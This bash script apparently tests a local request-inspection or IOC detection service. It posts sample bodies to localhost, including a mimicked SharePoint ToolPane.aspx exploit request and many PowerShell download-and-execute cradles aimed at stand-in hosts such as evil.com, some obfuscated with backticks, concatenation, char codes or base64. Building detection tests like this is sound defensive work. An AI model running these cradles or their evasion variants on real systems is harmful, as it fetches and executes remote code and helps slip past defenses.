#!/bin/bash

BASE_URL="https://localhost"
CURL="curl -k -s -o /dev/null -w '%{http_code}\n'"

echo "1. Plain text body (text/plain)"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data 'This is a plain text body.'

echo "2. JSON body (application/json)"
$CURL "$BASE_URL/test/json" -X POST -H "Content-Type: application/json" --data '{"key": "value", "test": true}'

echo "3. XML body (application/xml)"
$CURL "$BASE_URL/test/xml" -X POST -H "Content-Type: application/xml" --data '<root><item>value</item></root>'

echo "4. Form-encoded body (application/x-www-form-urlencoded)"
$CURL "$BASE_URL/test/form" -X POST -H "Content-Type: application/x-www-form-urlencoded" --data 'username=admin&password=secret'

echo "5. Binary body (application/octet-stream)"
# Generate 32 random bytes and send as binary
dd if=/dev/urandom bs=32 count=1 2>/dev/null | $CURL "$BASE_URL/test/binary" -X POST -H "Content-Type: application/octet-stream" --data-binary @-

echo "6. ViewState payload (text, triggers IOC)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST -H "Content-Type: text/plain" --data '__VIEWSTATE=malicious'

echo "7. JSON body to ToolPane exploit (triggers IOC + text preview)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx" \
  -X POST \
  -H "Referer: /_layouts/SignOut.aspx" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0" \
  -H "Content-Type: application/json" \
  --data '{"exploit": "true", "payload": "test"}'

echo "8. Binary body to ToolPane exploit (triggers IOC, binary preview only)"
dd if=/dev/urandom bs=32 count=1 2>/dev/null | $CURL "$BASE_URL/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx" \
  -X POST \
  -H "Referer: /_layouts/SignOut.aspx" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @-

echo "9. Plain text PowerShell IEX (Invoke-Expression)"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""

echo "10. Plain text PowerShell IEX offuscato (I\`E\`X)"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"I\`E\`X(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""

echo "11. Plain text base64 puro (senza EncodedCommand)"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data 'aW1wb3J0IC1tb2R1bGUgTmV0LldlYkNsaWVudA=='

echo "12. Plain text PowerShell pattern Invoke-WebRequest"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"Invoke-WebRequest -Uri http://malicious.com -OutFile C:\\\\mal.exe\""

echo "13. Plain text PowerShell pattern New-Object Net.WebClient"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"(New-Object Net.WebClient).DownloadFile('http://malicious.com/file.exe','C:\\\\file.exe')\""

echo "14. Plain text PowerShell IEX concatenato ('I'+'EX')"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"('I'+'EX'+' (New-Object Net.WebClient).DownloadString(''http://evil.com/shell.ps1''))\""

echo "15. Plain text PowerShell char codes ([char]73+[char]69+[char]88)"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"\$b=[char]73+[char]69+[char]88; iex(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""

echo "16. Plain text PowerShell variabile IEX (\$a='IEX'; &\$a)"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"\$a='IEX'; &\$a (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""

echo "17. Plain text PowerShell base64 UTF-16LE (aQBlAHgA = iex)"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data 'YQBlAHgA'

echo "18. Plain text PowerShell via cmd.exe wrapper"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "cmd.exe /c powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""

echo "19. Plain text PowerShell pipeline (IEX (Get-Content ...))"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"IEX (Get-Content C:\\\\temp\\\\payload.ps1)\""

echo "20. Plain text PowerShell Invoke-Obfuscation artifact"
$CURL "$BASE_URL/test/plain" -X POST -H "Content-Type: text/plain" --data "powershell -Command \"&([scriptblock]::Create((('JABXAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA='))))\""